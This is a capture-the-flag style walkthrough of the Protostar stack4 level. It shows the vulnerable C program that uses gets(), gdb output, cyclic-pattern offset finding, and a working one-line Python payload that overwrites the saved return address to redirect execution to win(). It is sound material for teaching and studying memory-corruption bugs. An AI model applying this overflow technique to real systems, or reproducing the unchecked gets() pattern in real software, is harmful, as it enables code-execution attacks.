## stack4

Stack4 takes a look at overwriting saved EIP and standard buffer overflows.

This level is at /opt/protostar/bin/stack4

Hints

A variety of introductory papers into buffer overflows may help.
gdb lets you do “run < input”
EIP is not directly after the end of buffer, compiler padding can also increase the size.

### Source code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

Analysis:

```bash
user@protostar:/opt/protostar/bin$ gdb -q stack4                                                                            
Reading symbols from /opt/protostar/bin/stack4...done.                                                                      
(gdb) info functions                                                                                                        
All defined functions:                                                                                                      
                                                                                                                            
File stack4/stack4.c:
int main(int, char **);
void win(void);

Non-debugging symbols:
0x080482bc  _init
0x080482fc  __gmon_start__
0x080482fc  __gmon_start__@plt
0x0804830c  gets
0x0804830c  gets@plt
0x0804831c  __libc_start_main
0x0804831c  __libc_start_main@plt
0x0804832c  puts
0x0804832c  puts@plt
0x08048340  _start
0x08048370  __do_global_dtors_aux
0x080483d0  frame_dummy
0x08048420  __libc_csu_fini
0x08048430  __libc_csu_init
0x0804848a  __i686.get_pc_thunk.bx
0x08048490  __do_global_ctors_aux
0x080484bc  _fini
(gdb) disassemble win
Dump of assembler code for function win:
0x080483f4 <win+0>:     push   %ebp
0x080483f5 <win+1>:     mov    %esp,%ebp
0x080483f7 <win+3>:     sub    $0x18,%esp
0x080483fa <win+6>:     movl   $0x80484e0,(%esp)
0x08048401 <win+13>:    call   0x804832c <puts@plt>
0x08048406 <win+18>:    leave  
0x08048407 <win+19>:    ret    
End of assembler dump.
(gdb)
```

address of win() : 0x080483f4

Finding the offset.
```bash
msf-pattern_create -l 80
```
![cyclic_pattern](pictures/stack4.1.png)

We can use metasploit to generate a cyclic pattern so we can find exactly where the eip register is overwritten.

```bash
(gdb) r
Starting program: /opt/protostar/bin/stack4 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
(gdb) 
```

```bash
msf-pattern_offset -l 80 -q 0x63413563
```

![pattern_offset](pictures/stack4.2.png)

Exploit:

```bash
user@protostar:/opt/protostar/bin$ python -c "print 'A'*76 + '\xf4\x83\x04\x08'" | ./stack4
code flow successfully changed
Segmentation fault
user@protostar:/opt/protostar/bin$
```


